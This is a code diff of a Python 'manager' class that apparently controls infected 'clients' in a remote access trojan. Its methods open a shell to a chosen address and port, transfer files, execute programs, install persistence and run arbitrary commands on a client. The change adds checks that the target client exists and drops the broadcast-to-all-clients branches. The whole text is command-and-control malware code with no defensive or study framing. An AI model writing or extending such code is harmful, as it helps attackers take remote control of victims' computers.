@@ -95,54 +95,58 @@ class manager:
         return r
 
 
-    def abrirShell(self,uid,addr,port):
-        self.getClientByIndex(uid).openShell(addr,port)
+    def abrirShell(self,clientuid,addr,port):
+        
+        if (self.getClientByIndex(clientuid)):
+            self.getClientByIndex(clientuid).openShell(addr,port)
+        else:
+            print("client don't find")
 
     def sendFile(self,fname,clientuid=0):
-        #do it for all
-        if clientuid==-1:
-            for uid in self.clientList:
-                self.clientList[uid].sendFile(fname)
-        else:
+        if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).sendFile(fname)
+        else:
+            print("client don't find")
 
     def downloadFile(self,fname,clientuid=0):
-        if clientuid==-1:
-            for uid in self.clientList:
-                self.clientList[uid].writefile(fname)
-        else:
+        if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).writefile(fname)
+        else:
+            print("client don't find")
+
 
     def executeProgram(self,fname,clientuid=0):
-        if clientuid==-1:
-            for uid in self.clientList:
-                self.clientList[uid].executeProgram(fname)
-        else:
+        if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).executeProgram(fname)
+        else:
+            print("client don't find")
 
     def installPersistency(self,clientuid=0):
-        if clientuid==-1:
-            for uid in self.clientList:
-                self.clientList[uid].installPersistency()
-        else:
+        if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).installPersistency()
+        else:
+            print("client don't find")
 
     def runCommand(self,cmd,clientuid=0):
         cmdList=[cmd]
-        if clientuid==-1:
-            for uid in self.clientList:
-                self.clientList[uid].runCommand(cmdList)
-        else:
+        if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).runCommand(cmdList)
+        else:
+            print("client don't find")
+            
+            
     
     def testServer(self):
         return "server ok"
     
     def testClient(self,clientuid=0):
-        if (self.getClientByIndex(clientuid).clientOK()):
-            return "Client ok"
+        if (self.getClientByIndex(clientuid)):
+            if (self.getClientByIndex(clientuid).clientOK()):
+                return "Client ok"
+            else:
+                return "Client don't ok"
         else:
-            return "client don't ok"
+            return "client don't find"
 
 
 
